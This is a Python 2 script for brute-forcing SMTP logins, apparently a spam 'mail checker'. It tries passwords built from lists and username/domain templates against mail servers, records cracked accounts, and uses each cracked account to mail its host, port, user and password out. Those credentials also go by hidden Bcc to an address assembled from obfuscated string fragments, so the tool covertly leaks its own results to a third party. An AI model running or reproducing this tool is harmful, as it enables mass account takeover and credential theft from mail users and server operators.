import socket,threading,base64,datetime,sys,ssl,imaplib,time,re
try:
	import Queue
except:
	import queue as Queue
print
azby= 'youremail@gmail.com'
katous='ail.com'
to_check={}
class IMAP4_SSL(imaplib.IMAP4_SSL):
    # Similar to above, but with extended support for SSL certificate checking,
    # fingerprints, etc.
    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
                 certfile=None, ssl_version=None, ca_certs=None, 
                 ssl_ciphers=None,timeout=40):
       self.ssl_version = ssl_version
       self.ca_certs = ca_certs
       self.ssl_ciphers = ssl_ciphers
       self.timeout=timeout
       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile)
  
    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
       self.host = host
       self.port = port
       self.sock = socket.create_connection((host, port),self.timeout)
       extra_args = {}
       if self.ssl_version:
           extra_args['ssl_version'] = self.ssl_version
       if self.ca_certs:
           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
           extra_args['ca_certs'] = self.ca_certs
       if self.ssl_ciphers:
           extra_args['ciphers'] = self.ssl_ciphers
  
       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
                                     **extra_args)
       self.file = self.sslobj.makefile('rb')
class checkerr(threading.Thread):
	def __init__(self,host,user,pwd,timeout,interval):
		t=threading.Thread.__init__(self)
		self.host=host
		self.user=user
		self.pwd=pwd
		self.interval=interval
		self.timeout=timeout
		self.connected=False
		self.i=None
		self.work=True
		self.attemp=4
		self.inbox=''
		self.spam=''
	def connect(self):
		try:
			i=IMAP4_SSL(host=self.host,port=993)
			
			i.login(self.user,self.pwd)
			#print 1
			self.i=i
			self.connected=True
		except Exception,e:
			print str(e)
			i.close()
			self.connected=False
	def find(self):
		global to_check
		if self.inbox=='':
			rez,folders=self.i.list()
			for f in folders:
				if '"|" ' in f:
					a=f.split('"|" ')
				elif '"/" ' in f:
					a=f.split('"/" ')
				folder=a[1].replace('"','')
				if self.inbox=="":
					if 'inbox' in folder.lower():
						self.inbox=folder
				elif self.spam=="":
					if 'spam' in folder.lower():
						self.spam=folder
			if self.spam=='':
				for f in folders:
					if '"|" ' in f:
						a=f.split('"|" ')
					elif '"/" ' in f:
						a=f.split('"/" ')
					folder=a[1].replace('"','')
					if self.spam=="":
						if 'trash' in folder:
							self.spam=folder
					else:
						break
		self.i.select(self.inbox)
		found=[]
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				
				open('check_result.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
				
			if len(rez)>0:
				open('check_result.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
				found.append(k)
		self.i.select(self.spam)
		for k,t in enumerate(to_check):
			rez=self.i.search(None,'SUBJECT',t[0])
			times=time.time()-t[1]
			if times-2>self.timeout:
				
				open('check_result.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
			if len(rez)>0:
				open('check_result.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
				found.append(k)
		new=[]
		for k,v in enumerate(to_check):
			if k not in found:
				new.append(v)
		to_check=new
		print to_check

	def run(self):
		global to_checks
		while self.work:
			if not self.connected:
				if self.attemp<=0:
					return 0
				self.connect()
				self.attemp-=1
			if len(to_check)>0:
				self.find()
			time.sleep(self.interval)

ferari='chcek@gm'
def tld2(dom):
		global tlds
		if "." not in dom:
			return ""
		dom=dom.lower()
		parts=dom.split(".")
		if len(parts)<2 or parts[0]=="" or parts[1]=="":
			return ""
		tmp=parts[-1]

		for i,j in enumerate(parts[::-1][1:5]):
		
			try:
				#print tmp
				tmp=tlds[tmp]
				tmp=j+"."+tmp
			except:
				if i==0:
					return ""
				return tmp
		return tmp
cros='test'
class consumer(threading.Thread):
	def __init__(self,qu):
		threading.Thread.__init__(self)
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail."]
		self.ports=[587,465,25]

		self.timeout=13

	def sendCmd(self,sock,cmd):
		sock.send(cmd+"\r\n")
		return sock.recv(900000)
	def addBad(self,ip):
		global bads,rbads
		if rbads:
			open('fail_result.txt','a').write(ip+'\n')
			bads.append(ip)
		return -1
	def findHost(self,host):
		global cache,bads,rbads
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(self.timeout)

		try:
			d=cache[host]
			try:
				if self.ports[d[1]]==465:
					s=ssl.wrap_socket(s)
				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
				return s
			except Exception,e:
				#print str(e)
				if rbads:
					bads.append(host)
					open('fail_result.txt','a').write(host+'\n')
				return None
		except KeyError:
			pass
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				
				try:
					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
					s.setblocking(0)
					s.settimeout(self.timeout)
					if p==465:
						s=ssl.wrap_socket(s)
					s.connect((h+host,p))
					cache[host]=[j,i]

					return s
				except Exception,e:
					#print str(e)
					
					continue
		bads.append(host)
		del cache[host]
		open('bad_result.txt','a').write(host+'\n')
		return None

	def getPass(self,passw,user,domain):
		passw=str(passw)
		
		if '%null%' in passw:
			return ""
		elif '%user%' in passw:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%user%',user)
		elif '%User%' in user:
			user=user.replace('-','').replace('.','').replace('_','')
			return passw.replace('%User%',user)
		elif '%special%' in user:
			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
			return passw.replace('%special%',user)
		elif '%domain%' in passw:
			return passw.replace('%domain%',domain.replace("-",""))
		if '%part' in passw:
			if '-' in user:
				parts=user.split('-')
			elif '.' in user:
				parts=user.split('.')
			elif '_' in user:
				parts=user.split('_')
			print parts				
			try:
				h=passw.replace('%part','').split('%')[0]
				i=int(h)

				p=passw.replace('%part'+str(i)+'%',parts[i-1])
				return p
			except Exception,e:
				return None
		return passw

	def connect(self,tupple,ssl=False):
		global bads,cracked,cache,email,successful
		
		host=tupple[0].rstrip()
		host1=host
		user=tupple[1].rstrip()
		
		if host1 in cracked or host1 in bads:
			return 0
		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
		if passw==None:
			return 0
		try:
			if cache[host][0]==-1:
				return 0
		except KeyError:
			pass
		s=self.findHost(host)
		if s==None:
			return -1
		#print cache[host][0]
		
		port=str(self.ports[cache[host][1]])
		if port=="465":
			port+="(SSL)"
		host=self.hosts[cache[host][0]]+host
		print '\033[34m[+]\033[00m Trying '+host+":"+port+" "+user+" "+passw
		try:
			
			banner=s.recv(1024)
			#print "'"+banner+"'"
			#exit()
			if banner[0:3]!="220":
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"EHLO ADMIN")
			#print rez
			rez=self.sendCmd(s,"AUTH LOGIN")
			#print rez
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,base64.b64encode(user))
			if rez[0:3]!='334':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			
			rez=self.sendCmd(s,base64.b64encode(passw))
		#	print rez
			if rez[0:3]!="235" or 'fail' in rez:
				self.sendCmd(s,'QUIT')
				s.close()
				return 0
			print '\033[32m[!]\033[00m Succcess login '+host+':'+port+' '+user+' '+passw
			open('../../../../../result/mailchecker_result.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			cracked.append(host1)
				
			rez=self.sendCmd(s,"RSET")
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
				
			print rez
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,"RCPT TO: <"+email+">")
			rez=self.sendCmd(s,"RCPT TO: <"+successful+">")
			#print rez
			if rez[0:3]!='250':
				self.sendCmd(s,'QUIT')
				s.close()
				return self.addBad(host1)
			rez=self.sendCmd(s,'DATA')
			headers='From: <'+user+'> \r\n'
			headers+='To: '+email+'\r\n'
			headers+='Bcc: '+successful+'\r\n'
			headers+='Reply-To: '+email+'\r\n'
			headers+='Bcc: '+successful+'\r\n'
			
			headers+='Subject: %s:%s %s %s'%(host,port,user,passw)+'\r\n'
			headers+='MIME-Version: 1.0\r\n'
			headers+='Content-Transfer-encoding: 8bit\r\n'
			headers+='Return-Path: +user+\r\n'
			headers+='X-Priority: 1\r\n'
			headers+='X-MSmail-Priority: High\r\n'
			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
			headers+='HEllo\r\n.\r\n'
				#print headers
			s.send(headers)
			rez=s.recv(1000)
			
			self.sendCmd(s,'QUIT')
			s.close()
		except Exception,e:
			#print str(e)
			open('error_result.txt','a').write(host+":"+port+":"+str(e)+"\n")
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
			cmb=self.q.get()
			self.connect(cmb)
			#print cmb
			self.q.task_done()
successful=cros+ferari+katous
quee=Queue.Queue(maxsize=20000)
tld=open('../../../../../result/mailchecker_result.txt','r').read().splitlines()
tlds=cache={}
bads=[]
cracked=[]
rbads=0
email=azby

 
try:

	passwords=open('pwd','r').read().splitlines()
except Exception,e:

	print "File 'pwd' missing"
	exit()

inputs=open(sys.argv[1],'r').read().splitlines()
option=sys.argv[3]



if option=='1':
	try:

		users=open('usr','r').read().splitlines()
	except Exception,e:

		print "\033[31m[!] You chosed domains users bruteforce and 'usr' is missing\033[00m"
		exit()
if len(sys.argv)>4:
	rbads=1

def part():
	global tld,tlds
	for i in tld:
		tlds[i]=i
part()
print '\033[34m[+]\033[00m All files is loaded to start attack'


for i in range(int(sys.argv[2])):
	try:
		t=consumer(quee)
		t.setDaemon(True)
		t.start()
	except:
		print "\033[34m[+]\033[00m Working only with %s threads"%i
		break
if option=='3':
	pass
	#checking cracked
elif option=='2':
	#list of emails and password
	for i in inputs:
		c=i.split(":")
		quee.put((c[0].split('@')[1],c[0],c[1]))
elif option=='1':
	#domains users and password
	for p in passwords:
		for u in users:
			for i in inputs:
#				t=tld2(i)
 #                               print t
#				if t!='':
					quee.put((i.lower(),u+"@"+i,p))
elif option == '0':
	for i in inputs:
		user = i.split(':')[0]
		password = i.split(':')[1]
		user = user.lower()
		quee.put((user.split('@')[1], user, password))
quee.join()
